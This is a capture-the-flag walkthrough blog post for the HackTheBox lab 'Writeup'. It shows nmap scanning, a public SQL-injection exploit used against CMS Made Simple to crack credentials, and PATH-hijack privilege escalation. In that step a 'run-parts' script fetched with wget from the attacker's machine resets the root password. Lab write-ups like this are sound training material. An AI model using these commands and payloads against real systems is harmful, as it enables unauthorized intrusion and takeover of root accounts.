@@ -1,0 +1,100 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Writeup Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-writeup-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-02-17T06:06:58+00:00">February 17, 2020</time><time class="updated" datetime="2025-06-27T12:27:28+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, we’re sharing another Hack Challenge Walkthrough box: Writeup and the machine is part of the retired lab, so you can connect to the machine using your HTB VPN and then start to solve the CTF.</span></p>
+<p><span style="color: #000000;"><em>The level of the Lab is set : Beginner to intermediate.</em></span></p>
+<p><span style="color: #000000;"><em>Task: Capture the user.txt and root.txt flags.</em></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Pentesting Methodology</span> </span></h3>
+<p><span style="color: #000000;"><strong>Network scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Web Source code</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploit</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Unauthenticated SQL injection</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">PATH Environment</span></li>
+</ul>
+<h3><span style="color: #000000;"><span style="color: #800000;">Network Scanning</span> </span></h3>
+<p><span style="color: #000000;">As we know the victim’s machine IP thus, we can start with Nmap scanning to identify the open ports and services running across it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.138</pre>
+<p><span style="color: #000000;">From this scanning result, we found that port 80 is open where the /writeup/ entry in the robot.txt has been shown. Besides, port 22 is also open for ssh.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K8RxVs_se-U/Xkoq5wRysmI/AAAAAAAAirA/LXnRszoiwK4bD1C1ikN_tZUd4zQCWZTdACLcBGAsYHQ/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration </span></h3>
+<p><span style="color: #000000;">As a result, we looked at the victim IP in the web browser and welcomed a web page shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MSEdqD3xMRk/Xkoq64nRmYI/AAAAAAAAirU/hMY6sJ1v63wzP0DPpTMEEAR4Oe0SaLupACLcBGAsYHQ/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Then we explore the URL below to examine /writeup as enumerated above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.138/writeup</pre>
+<p><span style="color: #000000;">It was a simple web page where we didn’t find any remarkable clue, so we were thinking about checking the source code of the page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FTobMfL4zFk/Xkoq7Us342I/AAAAAAAAirc/uWajJBGMnmYtGhnb2aoBZLhrZMKVvu7GACLcBGAsYHQ/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Well, thankfully! We found the description of the CMS used to build the website from inside the source code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4VgMuaRhANU/Xkoq7TMu4NI/AAAAAAAAirY/p9OYZC3RhvUx2iasNaxkhtpDmCFWd-uLACLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Without any delay, we have googled for CMS Made Simple-2019 Exploit and fortunately found the Exploit DB link to exploit the SQL Injection vulnerability.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-02hxPfqbzZE/Xkoq7UkGTHI/AAAAAAAAirg/kW-hb7viK4wVSQ9eRbFqpM5fA-kraGMowCLcBGAsYHQ/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Exploit</span></h3>
+<p><span style="color: #000000;">We just downloaded the python script from the <a style="color: #000000;" href="https://www.exploit-db.com/exploits/46635">ExploitDB</a> and gave ALL permission. When things are set, we run the following command to obtain the credential from inside the database by exploiting unauthorized SQL injection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XLupTFeVjYs/Xkoq79kCWYI/AAAAAAAAirk/pxvFFbeLfIInTXQ9jTsPOCLpletYBaXQgCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">As a result we found salt value, username, email address, password hashes and its password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gxlpV8q3DGs/Xkoq8IfyMKI/AAAAAAAAiro/0K_mQfcdK2IX6sUcKKNZp9CVMR2NIgRTACLcBGAsYHQ/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Since we have found the login credential, we can use it to access the ssh shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh jkr@10.10.10.138</pre>
+<p><span style="color: #000000;">Booom!! We successfully got the host machine shell and found the user.txt file as shown in the below image. Now it was time to obtain the higher privilege shell by escalating the privilege of the user jkr.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jcs2gfG8fjw/Xkoq8c2XG8I/AAAAAAAAirs/c7AKBV_xLT4a7908aQN9xdIgIKYWTmRIACLcBGAsYHQ/s1600/8.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation</span> </span></h3>
+<p><span style="color: #000000;">It was time to post enumeration to determine the concealed process running on the host machine. We try to enumerate the services running as root that can be abused, and to do this, we have to use <a style="color: #000000;" href="https://github.com/DominicBreuker/pspy">pspy64</a> to identify the services running, because the manual approach failed to identify all processes running in the background.</span></p>
+<p><span style="color: #000000;">Therefore, we downloaded the pspy64 script in the host machine inside /tmp directory and assign full permissions then ran it to identify processes running of the machine. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget http://192.168.14.15:8000/pspy64
+chmod 777 pspy64
+./pspy64</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bwq1iwVZg6o/Xkoq8sXGLpI/AAAAAAAAirw/oTRTWT1hfV0mD41eBMl5TXLbrUUaHspXwCLcBGAsYHQ/s1600/9.png"/></span></p>
+<h4><span style="color: #000000;">Analyzing Suspicious Process</span></h4>
+<p><span style="color: #000000;">So, we found that a suspicious process was underway, which was executing the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</pre>
+<p><span style="color: #000000;">We’re trying to break down in order to analyze what’s going on in the current phase.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</pre>
+<p><span style="color: #000000;">Here we saw that the “sh -c /usr/bin/env” command was running to create an empty environment to set up the PATH variable, and you can observe that “/usr/local/sbin” is at the top, which means it will have the highest priority.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</pre>
+<p><span style="color: #000000;">All the scripts in /etc/update-motd.d using run-parts, then stores all output in /run/motd.dynamic.new</span></p>
+<p><span style="color: #000000;">Interestingly, we found that the above command was running when jkr connects to ssh to access the server, so we can assume that every time we connect to ssh as jkr, the script will run with the help of the command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UYyk-JS2vi8/Xkoq5-WkNiI/AAAAAAAAirI/wlHTo955y9sDFPtTLuMRwlJQPH7NqjGIgCLcBGAsYHQ/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Thus we check the permissions for /usr/local/sbin and note the ownership as root:staff, then we checked for user_id and luckily find that jkr is the member of staff group.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EHII7pJHuO8/Xkoq55gnUVI/AAAAAAAAirE/1Y_TZj_nDLgzJhB3SYx_RTNVuHWW4R4RgCLcBGAsYHQ/s1600/11.png"/></span></p>
+<h4><span style="color: #000000;">Creating Malicious Payload</span></h4>
+<p><span style="color: #000000;">Since /usr/local/sbin is being set as the priority path, hence we can try to write a malicious file inside the /usr/local/sbin/ with a name as run-parts.</span></p>
+<p><span style="color: #000000;">So, in our local machine we write a script, to change the password for user root and save it as run-parts,</span></p>
+<p><span style="color: #000000;">Then transfer this file on the host machine using HTTP python server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">#!/bin/bash
+echo "root:raj@123"|chpasswd
+python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f9BoD-1Wgo4/Xkoq6QI9mFI/AAAAAAAAirM/sxYZc32da5UL3JP-Uv7HwnslKhV-cqKiQCLcBGAsYHQ/s1600/12.png"/></span></p>
+<h4><span style="color: #000000;">Executing Privilege Escalation</span></h4>
+<p><span style="color: #000000;">Let’s download the malicious script to the host machine inside the /tmp directory and give it full permission to copy it to “/usr /local/sbin” as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget http://10.10.14.15:8000/run-parts
+chmod 777 run-parts
+cp run-parts /usr/local/sbin</pre>
+<p><span style="color: #000000;">When everything is done, we need to logout and then log in again with ssh as jkr so that the system executes our malicious script as said above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh jkr@10.10.10.138
+su root
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;">Booom! Booom! We’ve got the root flag, as soon as you connect to ssh again, the running process will run our malicious run-parts script, which will modify the root user password, and then you can switch the user as root and catch the root.txt flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qomVT2Ta4PY/Xkoq6n_lcpI/AAAAAAAAirQ/LhIhDXdhErwvGqX41Pz7ZI7N_8ZDe3ldQCLcBGAsYHQ/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact </span><a href="https://www.linkedin.com/in/kavish-tyagi-844239125/"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
